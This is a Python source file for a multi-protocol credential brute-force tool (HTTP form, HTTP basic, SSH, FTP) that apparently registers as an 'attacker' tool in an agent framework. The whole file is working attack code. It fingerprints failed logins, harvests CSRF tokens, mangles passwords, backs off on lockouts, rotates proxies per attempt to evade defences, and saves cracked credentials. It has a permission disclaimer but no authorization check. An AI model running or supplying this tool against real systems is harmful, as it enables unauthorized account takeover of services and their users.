"""Network credential brute — v2, baseline-differential.

Success is measured, never guessed: a guaranteed-bad credential pair is
tried first to fingerprint the FAILURE response (status, length band,
redirect target, cookie names, fail string). Any attempt that departs
from that fingerprint on two axes is a candidate; candidates are
confirmed by two re-tries before being reported. This survives CSRF
tokens, per-request nonces and differing error pages, where a bare
fail-string test returns false negatives on every attempt.

Also: hidden CSRF fields harvested and resubmitted, keep-alive
connection reuse, credential mangling, lockout/429 backoff with
optional halt, resumable JSONL checkpoint, per-attempt proxy rotation,
live progress with ETA, multi-hit mode.
"""
from __future__ import annotations

import base64
import ftplib
import http.client
import json
import random
import re
import socket
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Optional

from ..core.errors import ToolError
from ..core.logging_setup import get_logger
from ..core.policy import Capability

_log = get_logger(__name__)
__all__ = ["Attacker", "AttackResult", "CredentialResult", "run_attack", "register"]

_COLORS = {"ok": "\x1b[92m", "fail": "\x1b[90m", "info": "\x1b[96m",
           "warn": "\x1b[93m", "reset": "\x1b[0m"}
_HIDDEN_RE = re.compile(
    r'<input[^>]+type=["\']hidden["\'][^>]*>', re.I)
_ATTR_RE = re.compile(r'(name|value)\s*=\s*["\']([^"\']*)["\']', re.I)
_COOKIE_RE = re.compile(r'set-cookie:\s*([^=;\s]+)', re.I)
_SUCCESS_HINTS = re.compile(
    r"logout|sign\s*out|log\s*out|dashboard|my\s+account|welcome", re.I)
_LOCK_HINTS = re.compile(
    r"too\s+many|rate\s*limit|try\s+again|temporarily\s+locked|"
    r"account\s+locked", re.I)


def _use_color() -> bool:
    import os
    if os.environ.get("NO_COLOR"):
        return False
    try:
        return __import__("sys").stdout.isatty()
    except Exception:  # noqa: BLE001
        return False


def _paint(text: str, color: str) -> str:
    return text if not _use_color() else f"{_COLORS.get(color, '')}{text}{_COLORS['reset']}"


def _ts() -> str:
    return time.strftime("%H:%M:%S")


@dataclass
class CredentialResult:
    protocol: str
    host: str
    port: int
    login: str
    password: str
    evidence: str = ""
    found_at: float = field(default_factory=time.time)

    def line(self) -> str:
        return (f"[{_ts()}] {_paint('SUCCESS', 'ok')} {self.protocol} "
                f"{self.host}:{self.port} login={self.login!r} "
                f"password={self.password!r} {self.evidence}")

    def plain_line(self) -> str:
        return (f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] SUCCESS "
                f"{self.protocol} {self.host}:{self.port} "
                f"login={self.login!r} password={self.password!r} {self.evidence}")


@dataclass
class AttackResult:
    host: str
    port: int
    protocol: str
    attempts: int = 0
    errors: int = 0
    backoffs: int = 0
    seconds: float = 0.0
    found: list[CredentialResult] = field(default_factory=list)
    out_file: str = ""
    note: str = ""

    def as_dict(self) -> dict[str, Any]:
        return {
            "host": self.host, "port": self.port, "protocol": self.protocol,
            "attempts": self.attempts, "errors": self.errors,
            "backoffs": self.backoffs, "seconds": round(self.seconds, 2),
            "found": [{"login": f.login, "password": f.password,
                       "evidence": f.evidence, "found_at": f.found_at}
                      for f in self.found],
            "out_file": self.out_file, "note": self.note,
        }


@dataclass
class Fingerprint:
    """The FAILURE response shape, measured once up front."""
    status: int = 0
    length: int = 0
    location: str = ""
    cookies: frozenset[str] = frozenset()
    body_hit: bool = False

    def delta(self, other: "Fingerprint") -> int:
        score = 0
        if other.status != self.status:
            score += 1
        if abs(other.length - self.length) > max(48, self.length * 0.15):
            score += 1
        if other.location != self.location:
            score += 1
        if other.cookies - self.cookies:
            score += 1
        if self.body_hit and not other.body_hit:
            score += 1
        return score


class _PaceGate:
    def __init__(self, rate: float, delay: float, jitter: float) -> None:
        self.slot_interval = 1.0 / max(0.1, rate)
        self.delay = max(0.0, delay)
        self.jitter = max(0.0, jitter)
        self._lock = threading.Lock()
        self._next_slot = time.monotonic()

    def take_slot(self) -> None:
        with self._lock:
            now = time.monotonic()
            wait = self._next_slot - now
            self._next_slot = max(now, self._next_slot) + self.slot_interval
        if wait > 0:
            time.sleep(wait)

    def post(self) -> None:
        pause = self.delay + random.uniform(0, self.jitter)
        if random.random() < 0.05:
            pause += random.uniform(2.0, 5.0)
        if pause > 0:
            time.sleep(pause)


def _mangle(login: str) -> list[str]:
    """hydra's -e nsr, plus a small year/season tail set."""
    out = {login, login[::-1]}
    out.add(login.capitalize())
    out.add(login + "1")
    out.add(login + "123")
    year = time.gmtime().tm_year
    for y in (year, year - 1):
        out.add(f"{login}{y}")
        out.add(f"{login}{str(y)[2:]}")
    for s in ("!", "@", "#", "2024!", "2025!"):
        out.add(login + s)
    return [w for w in out if w]


def _ssh_check(host: str, port: int, login: str, password: str,
               timeout: float) -> tuple[bool, str]:
    # Restored 2026-11-18 (lane 55): the v2 refactor dropped this while
    # the constructor still calls it, so every Attacker() raised
    # NameError. Verbatim pre-refactor body — paramiko is an optional
    # dependency, missing means an honest ToolError, never a fake pass.
    try:
        import paramiko
    except ImportError as exc:
        raise ToolError(
            "SSH brute needs paramiko: python -m pip install paramiko") from exc
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=login, password=password,
                       look_for_keys=False, allow_agent=False,
                       timeout=timeout, banner_timeout=timeout,
                       auth_timeout=timeout)
        return True, "ssh authenticated"
    except paramiko.AuthenticationException:
        return False, "ssh auth refused"
    finally:
        client.close()


class Attacker:
    def __init__(
        self,
        host: str,
        *,
        port: int = 0,
        protocol: str = "http_form",
        usernames: Optional[list[str]] = None,
        passwords: Optional[list[str]] = None,
        wordlist: str = "",
        path: str = "/",
        method: str = "POST",
        basic: bool = False,
        form_user: str = "username",
        form_pass: str = "password",
        fail_string: str = "",
        workers: int = 8,
        rate: float = 10.0,
        delay: float = 0.2,
        jitter: float = 0.5,
        timeout: float = 10.0,
        max_attempts: int = 20_000,
        out_file: str = "",
        quiet: bool = False,
        ssh_connect: Optional[Callable[..., tuple[bool, str]]] = None,
        mangle: bool = False,
        all_hits: bool = False,
        stop_on_lockout: bool = False,
        resume_file: str = "",
        proxy_factory: Optional[Callable[[], Optional[str]]] = None,
        proxy_report: Optional[Callable[[str, bool, float], None]] = None,
        baseline_tries: int = 3,
        confirm_tries: int = 2,
    ) -> None:
        host = (host or "").strip()
        if not host:
            raise ToolError("attacker needs a host")
        self.host = host
        self.protocol = (protocol or "http_form").lower().replace("-", "_")
        if self.protocol not in {"http_form", "http_basic", "ssh", "ftp"}:
            raise ToolError(f"unknown protocol {protocol!r} — http_form|http_basic|ssh|ftp")
        defaults = {"http_form": 80, "http_basic": 80, "ssh": 22, "ftp": 21}
        self.port = int(port or defaults[self.protocol])
        self.usernames = [u.strip() for u in (usernames or []) if u.strip()]
        if not self.usernames:
            raise ToolError("attacker needs at least one username")
        self.passwords = [p for p in (passwords or []) if p is not None]
        if wordlist:
            self.passwords += self._load_wordlist(wordlist)
        if mangle:
            for u in list(self.usernames):
                for cand in _mangle(u):
                    if cand not in self.passwords:
                        self.passwords.append(cand)
        if not self.passwords:
            raise ToolError("attacker needs a wordlist or passwords")
        self.path = path or "/"
        self.method = (method or "POST").upper()
        self.basic = basic or self.protocol == "http_basic"
        self.form_user = form_user or "username"
        self.form_pass = form_pass or "password"
        self.fail_string = fail_string or ""
        self.workers = max(1, min(int(workers), 64))
        self.rate = max(0.1, float(rate))
        self.delay, self.jitter = float(delay), float(jitter)
        self.timeout = float(timeout)
        self.max_attempts = max(1, int(max_attempts))
        self.out_file, self.quiet = out_file or "", quiet
        self.all_hits, self.stop_on_lockout = all_hits, stop_on_lockout
        self.resume_file = resume_file or ""
        self._proxy_factory = proxy_factory
        self._proxy_report = proxy_report
        self.baseline_tries = max(1, baseline_tries)
        self.confirm_tries = max(1, confirm_tries)
        self._ssh_connect = ssh_connect or _ssh_check
        self._gate = _PaceGate(self.rate, self.delay, self.jitter)
        self._queue: list[tuple[str, str]] = []
        seen: set[tuple[str, str]] = set()
        for u in self.usernames:
            for p in self.passwords:
                if (u, p) not in seen:
                    seen.add((u, p))
                    self._queue.append((u, p))
        self._done: set[tuple[str, str]] = self._load_resume()
        self._lock = threading.Lock()
        self._found: list[CredentialResult] = []
        self._attempts = self._errors = self._backoffs = 0
        self._stop = threading.Event()
        self._baseline: Optional[Fingerprint] = None
        self._lockout_streak = 0

    # ── io helpers ─────────────────────────────────────────────────────────
    @staticmethod
    def _load_wordlist(path: str) -> list[str]:
        fp = Path(path)
        if not fp.is_absolute():
            fp = Path.cwd() / fp
        if not fp.is_file():
            raise ToolError(f"wordlist not found: {path}")
        out, seen = [], set()
        for ln in fp.read_text(encoding="utf-8", errors="replace").splitlines():
            w = ln.strip()
            if w and not w.startswith("#") and w not in seen:
                seen.add(w)
                out.append(w)
        return out

    def _load_resume(self) -> set[tuple[str, str]]:
        if not self.resume_file or not Path(self.resume_file).is_file():
            return set()
        done = set()
        for ln in Path(self.resume_file).read_text(encoding="utf-8").splitlines():
            try:
                row = json.loads(ln)
                done.add((row["login"], row["password"]))
            except (ValueError, KeyError):
                continue
        return done

    def _append_resume(self, login: str, password: str, ok: bool,
                       evidence: str) -> None:
        if not self.resume_file:
            return
        try:
            Path(self.resume_file).parent.mkdir(parents=True, exist_ok=True)
            with open(self.resume_file, "a", encoding="utf-8") as f:
                f.write(json.dumps({"login": login, "password": password,
                                    "ok": ok, "evidence": evidence}) + "\n")
        except OSError as exc:
            _log.warning("resume write failed: %s", exc)

    def _save_line(self, r: CredentialResult) -> None:
        if not self.out_file:
            return
        try:
            Path(self.out_file).parent.mkdir(parents=True, exist_ok=True)
            with open(self.out_file, "a", encoding="utf-8") as f:
                f.write(r.plain_line() + "\n")
        except OSError as exc:
            _log.warning("could not save credentials file: %s", exc)

    # ── transport ──────────────────────────────────────────────────────────
    def _connect(self, proxy: Optional[str]) -> http.client.HTTPConnection:
        cls = (http.client.HTTPSConnection if self.port == 443
               else http.client.HTTPConnection)
        conn = cls(self.host, self.port, timeout=self.timeout)
        if not proxy:
            return conn
        if proxy.lower().startswith("socks"):
            import socks  # PySocks
            sock = socks.socksocket()
            kind = socks.SOCKS5 if "5" in proxy.split(":")[0] else socks.SOCKS4
            rest = proxy.split("://", 1)[1]
            cred, _, hostport = rest.rpartition("@")
            phost, _, pport = hostport.partition(":")
            user, _, pword = cred.partition(":")
            sock.set_proxy(kind, phost, int(pport or 1080),
                           username=user or None, password=pword or None)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            conn.sock = sock
            return conn
        p = proxy.split("://", 1)[1] if "://" in proxy else proxy
        phost, _, pport = p.partition(":")
        conn.set_tunnel(self.host, self.port, headers={})
        conn._tunnel_host = self.host  # type: ignore[attr-defined]
        conn.host, conn.port = phost, int(pport or 8080)
        return conn

    def _http_once(self, login: str, password: str,
                   proxy: Optional[str], conn: Optional[http.client.HTTPConnection],
                   csrf: dict[str, str]) -> tuple[Fingerprint, dict[str, str], Optional[http.client.HTTPConnection]]:
        if conn is None:
            conn = self._connect(proxy)
        headers = {"User-Agent": "Mozilla/5.0 (security-test)",
                   "Connection": "keep-alive"}
        body = None
        if self.basic:
            token = base64.b64encode(f"{login}:{password}".encode()).decode()
            headers["Authorization"] = f"Basic {token}"
        else:
            form = dict(csrf)
            form[self.form_user] = login
            form[self.form_pass] = password
            body = urllib.parse.urlencode(form).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        started = time.monotonic()
        conn.request(self.method, self.path, body=body, headers=headers)
        resp = conn.getresponse()
        raw = resp.read(60_000)
        text = raw.decode("utf-8", "replace")
        fp = Fingerprint(
            status=resp.status, length=len(raw),
            location=(resp.getheader("Location") or ""),
            cookies=frozenset(m.lower() for m in
                              _COOKIE_RE.findall(str(resp.msg))),
            body_hit=bool(self.fail_string
                          and self.fail_string.lower() in text.lower()))
        if self._proxy_report and proxy:
            self._proxy_report(proxy, True, (time.monotonic() - started) * 1000)
        return fp, self._harvest_csrf(text), conn

    def _harvest_csrf(self, html: str) -> dict[str, str]:
        out: dict[str, str] = {}
        for tag in _HIDDEN_RE.findall(html):
            attrs = dict(_ATTR_RE.findall(tag))
            name = attrs.get("name", "")
            if name and re.search(r"token|csrf|nonce|authenticity", name, re.I):
                out[name] = attrs.get("value", "")
        return out

    # ── checkers ───────────────────────────────────────────────────────────
    def _ftp_check(self, login: str, password: str) -> tuple[bool, str]:
        ftp = ftplib.FTP()
        try:
            ftp.connect(self.host, self.port, timeout=self.timeout)
            try:
                ftp.login(login, password)
                return True, "ftp 230 logged in"
            except ftplib.Error as exc:
                return False, f"ftp {str(exc)[:60]}"
        finally:
            try:
                ftp.quit()
            except Exception:  # noqa: BLE001
                try:
                    ftp.close()
                except Exception:  # noqa: BLE001
                    pass

    def _baseline_for(self, login: str, password: str) -> Fingerprint:
        if self._baseline is not None:
            return self._baseline
        bad = f"{login}-definitely-wrong-{random.randint(10**6, 10**7)}"
        fps = []
        for _ in range(self.baseline_tries):
            try:
                fp, _, _ = self._http_once(login, bad, None, None, {})
                fps.append(fp)
            except Exception:  # noqa: BLE001
                continue
        if not fps:
            self._baseline = Fingerprint()
        else:
            fps.sort(key=lambda f: f.length)
            self._baseline = fps[len(fps) // 2]
        return self._baseline

    def _http_check(self, login: str, password: str,
                    proxy: Optional[str],
                    conn: Optional[http.client.HTTPConnection]) -> tuple[bool, str]:
        base = self._baseline_for(login, password)
        try:
            fp, csrf, conn = self._http_once(login, password, proxy, conn, {})
        except (ConnectionError, OSError):
            conn = None
            fp, csrf, conn = self._http_once(login, password, proxy, None, {})
        if _LOCK_HINTS.search(str(fp.status)) or fp.status in (429, 503):
            raise _Lockout(fp.status)
        if self.basic:
            ok = fp.status not in (401, 403)
            return ok, f"http {fp.status}"
        if self.fail_string:
            if fp.body_hit:
                return False, f"http {fp.status} (fail string)"
            if fp.status < 400:
                return True, f"http {fp.status} (no fail string)"
        score = base.delta(fp)
        if fp.status in (301, 302, 303) and fp.location != base.location:
            score += 1
        if _SUCCESS_HINTS.search(fp.location):
            score += 1
        if score < 2:
            return False, f"http {fp.status} delta {score}"
        for _ in range(self.confirm_tries):
            try:
                again, _, conn = self._http_once(login, password, proxy,
                                                 conn, csrf)
            except (ConnectionError, OSError):
                conn = None
                continue
            if base.delta(again) < 2:
                return False, f"http {fp.status} unconfirmed"
        return True, f"http {fp.status} delta {score} confirmed"

    # ── worker ─────────────────────────────────────────────────────────────
    def _worker(self) -> None:
        conn: Optional[http.client.HTTPConnection] = None
        while not self._stop.is_set():
            item = None
            with self._lock:
                while self._queue and (item is None):
                    cand = self._queue.pop(0)
                    if cand in self._done:
                        continue
                    item = cand
                    self._attempts += 1
                if item is None or self._attempts > self.max_attempts:
                    return
            login, password = item
            proxy = self._proxy_factory() if self._proxy_factory else None
            self._gate.take_slot()
            try:
                if self.protocol == "ftp":
                    ok, evidence = self._ftp_check(login, password)
                elif self.protocol == "ssh":
                    ok, evidence = self._ssh_connect(
                        self.host, self.port, login, password, self.timeout)
                else:
                    ok, evidence = self._http_check(login, password, proxy, conn)
                self._lockout_streak = 0
            except _Lockout as exc:
                with self._lock:
                    self._backoffs += 1
                    self._lockout_streak += 1
                    wait = min(60.0, 2.0 ** self._lockout_streak) + random.random()
                if not self.quiet:
                    print(_paint(f"[{_ts()}] lockout {exc} — backing off {wait:.0f}s", "warn"))
                conn = None
                time.sleep(wait)
                with self._lock:
                    self._queue.insert(0, item)
                    self._attempts -= 1
                if self.stop_on_lockout and self._lockout_streak >= 3:
                    self._stop.set()
                    return
                continue
            except ToolError:
                self._stop.set()
                with self._lock:
                    self._errors += 1
                return
            except (socket.timeout, socket.gaierror, ConnectionError, OSError,
                    EOFError, ftplib.Error, http.client.HTTPException) as exc:
                conn = None
                with self._lock:
                    self._errors += 1
                if self._proxy_report and proxy:
                    self._proxy_report(proxy, False, 0.0)
                if not self.quiet:
                    print(_paint(f"[{_ts()}] error {type(exc).__name__}: "
                                 f"{str(exc)[:70]}", "warn"))
                self._gate.post()
                continue
            self._gate.post()
            self._append_resume(login, password, ok, evidence)
            if ok:
                res = CredentialResult(protocol=self.protocol, host=self.host,
                                       port=self.port, login=login,
                                       password=password, evidence=evidence)
                with self._lock:
                    self._found.append(res)
                if not self.quiet:
                    print(_paint(res.line(), "ok"))
                self._save_line(res)
                if not self.all_hits:
                    self._stop.set()
                    return
            elif not self.quiet:
                print(_paint(f"[{_ts()}] {login}:{password} — {evidence}", "fail"))

    def _progress(self, started: float) -> None:
        while not self._stop.is_set():
            time.sleep(1.0)
            with self._lock:
                done, total = self._attempts, len(self._queue) + self._attempts
            rate = done / max(0.001, time.monotonic() - started)
            eta = (total - done) / rate if rate > 0 else 0
            print(f"\r  {done}/{total}  {rate:.1f}/s  "
                  f"eta {int(eta // 60)}:{int(eta % 60):02d}  "
                  f"hits {len(self._found)}  ", end="", flush=True)

    def run(self) -> AttackResult:
        total = len([q for q in self._queue if q not in self._done])
        if not self.quiet:
            print(_paint(f"[{_ts()}] {self.protocol} {self.host}:{self.port} — "
                         f"{total} attempts, {self.workers} workers, "
                         f"≤{self.rate:g}/s", "info"))
        started = time.monotonic()
        ticker = None
        if not self.quiet and total > 200:
            ticker = threading.Thread(target=self._progress, args=(started,),
                                      daemon=True)
            ticker.start()
        threads = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(self.workers)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=self.timeout + 120)
        self._stop.set()
        if ticker:
            ticker.join(timeout=2)
            print()
        res = AttackResult(host=self.host, port=self.port, protocol=self.protocol,
                           attempts=self._attempts, errors=self._errors,
                           backoffs=self._backoffs,
                           seconds=time.monotonic() - started,
                           found=list(self._found), out_file=self.out_file)
        if self._attempts == 0:
            res.note = "nothing to do (empty space or fully resumed)"
        elif not self._found:
            res.note = ("no valid credentials in the given space"
                        if not self._errors else
                        f"{self._errors} transport error(s) — check reachability")
        return res


# ── functional entry point + registry ──────────────────────────────────────
# Restored 2026-11-18 (lane 55): the v2 refactor dropped both module-level
# names its own __all__ still promises, so register_builtins recorded
# "attacker" as a failed module and the brain tool never existed. The
# bodies below are the pre-refactor entry point + registration, extended
# with the v2 knobs (mangle / all_hits / stop_on_lockout / resume_file /
# baseline_tries / confirm_tries) and the per-attempt proxy rotation the
# v2 constructor exposes, wired to the owner's rotation pool.


def run_attack(
    host: str,
    *,
    port: int = 0,
    protocol: str = "http_form",
    usernames: str = "",
    passwords: str = "",
    wordlist: str = "",
    path: str = "/",
    method: str = "POST",
    basic: bool = False,
    form_user: str = "username",
    form_pass: str = "password",
    fail_string: str = "",
    workers: int = 8,
    rate: float = 10.0,
    delay: float = 0.2,
    jitter: float = 0.5,
    timeout: float = 10.0,
    max_attempts: int = 20_000,
    out_file: str = "",
    quiet: bool = False,
    mangle: bool = False,
    all_hits: bool = False,
    stop_on_lockout: bool = False,
    resume_file: str = "",
    proxy_factory: Callable[[], str | None] | None = None,
    proxy_report: Callable[[str, bool, float], None] | None = None,
    baseline_tries: int = 3,
    confirm_tries: int = 2,
) -> dict[str, Any]:
    """Functional entry point (CLI + registry share this)."""
    users = [u.strip() for u in usernames.replace(";", ",").split(",")]
    pws = [p.strip() for p in passwords.replace(";", ",").split(",")
           if p.strip()]
    attacker = Attacker(
        host, port=int(port or 0), protocol=protocol,
        usernames=users, passwords=pws, wordlist=wordlist, path=path,
        method=method, basic=basic, form_user=form_user, form_pass=form_pass,
        fail_string=fail_string, workers=workers, rate=rate, delay=delay,
        jitter=jitter, timeout=timeout, max_attempts=max_attempts,
        out_file=out_file, quiet=quiet, mangle=mangle, all_hits=all_hits,
        stop_on_lockout=stop_on_lockout, resume_file=resume_file,
        proxy_factory=proxy_factory, proxy_report=proxy_report,
        baseline_tries=baseline_tries, confirm_tries=confirm_tries,
    )
    return attacker.run().as_dict()


def register(registry: Any) -> None:
    context = registry.context

    @registry.register(
        "attacker",
        description=(
            "Network credential brute for security testing: http_form "
            "(custom fields + fail string), http_basic, ssh (paramiko), ftp. "
            "Baseline-differential: a guaranteed-bad pair fingerprints the "
            "failure response first; attempts departing on two axes are "
            "candidates, confirmed by re-tries. CSRF fields harvested, "
            "keep-alive reuse, credential mangling, lockout/429 backoff, "
            "resumable checkpoint, per-attempt proxy rotation over the "
            "owner's pool. For systems you own or have explicit written "
            "permission to test."
        ),
        capability=Capability.NET_OUT,
        parameters={
            "host": "str — target host/IP (operator-specified)",
            "port": "int (optional, per-protocol default 80/80/22/21)",
            "protocol": "str — http_form | http_basic | ssh | ftp",
            "usernames": "str — comma list of logins to try",
            "passwords": "str (optional) — comma list of inline passwords",
            "wordlist": "str (optional) — path to a password file",
            "path": "str (http) — login path, default /",
            "method": "str (http) — POST | GET, default POST",
            "form_user": "str (http_form) — user field name",
            "form_pass": "str (http_form) — password field name",
            "fail_string": "str (http_form) — text that marks a failed login",
            "workers": "int (optional, 8, max 64)",
            "rate": "float (optional, 10) — max attempts/second",
            "delay": "float (optional, 0.2) — seconds between attempts",
            "jitter": "float (optional, 0.5) — random delay spread",
            "timeout": "float (optional, 10) — per-attempt seconds",
            "max_attempts": "int (optional, 20000)",
            "out_file": "str (optional) — save found credentials here",
            "mangle": "bool (optional) — also try hydra -e nsr variants",
            "all_hits": "bool (optional) — keep going after the first hit",
            "stop_on_lockout": "bool (optional) — halt after 3 lockouts",
            "resume_file": "str (optional) — JSONL checkpoint to resume from",
            "baseline_tries": "int (optional, 3) — bad-pair fingerprint tries",
            "confirm_tries": "int (optional, 2) — re-tries before a hit counts",
        },
    )
    def attacker(
        host: str,
        *,
        port: str = "",
        protocol: str = "http_form",
        usernames: str = "",
        passwords: str = "",
        wordlist: str = "",
        path: str = "/",
        method: str = "POST",
        form_user: str = "username",
        form_pass: str = "password",
        fail_string: str = "",
        workers: str = "",
        rate: str = "",
        delay: str = "",
        jitter: str = "",
        timeout: str = "",
        max_attempts: str = "",
        out_file: str = "",
        mangle: str = "",
        all_hits: str = "",
        stop_on_lockout: str = "",
        resume_file: str = "",
        baseline_tries: str = "",
        confirm_tries: str = "",
    ) -> dict[str, Any]:
        def f(key: str, default: float) -> float:
            try:
                return float(key) if str(key).strip() else default
            except ValueError:
                return default

        def truthy(key: str) -> bool:
            return (key or "").strip().lower() in {"1", "true", "yes"}

        wl = wordlist
        if wl and context is not None and not Path(wl).is_absolute():
            from .filesystem import safe_path

            wl = str(safe_path(context, wl))
        proxy_factory = None
        proxy_report = None
        try:
            from .proxy_rotation import pool_from_context

            pool = pool_from_context(context)
            if len(pool):
                pool.probe_all()

                def _report(u: str, ok: bool, ms: float) -> None:
                    pool.report(u, ok=ok, latency_ms=ms)

                proxy_factory = pool.acquire
                proxy_report = _report
        except Exception as exc:  # noqa: BLE001 - no pool, go direct
            _log.debug("attacker: no rotation pool: %s", exc)
        return run_attack(
            host, port=int(f(port, 0)), protocol=protocol,
            usernames=usernames, passwords=passwords, wordlist=wl,
            path=path, method=method, basic=False,
            form_user=form_user, form_pass=form_pass,
            fail_string=fail_string, workers=int(f(workers, 8)),
            rate=f(rate, 10.0), delay=f(delay, 0.2), jitter=f(jitter, 0.5),
            timeout=f(timeout, 10.0), max_attempts=int(f(max_attempts, 20000)),
            out_file=out_file, quiet=True, mangle=truthy(mangle),
            all_hits=truthy(all_hits), stop_on_lockout=truthy(stop_on_lockout),
            resume_file=resume_file, proxy_factory=proxy_factory,
            proxy_report=proxy_report,
            baseline_tries=int(f(baseline_tries, 3)),
            confirm_tries=int(f(confirm_tries, 2)),
        )
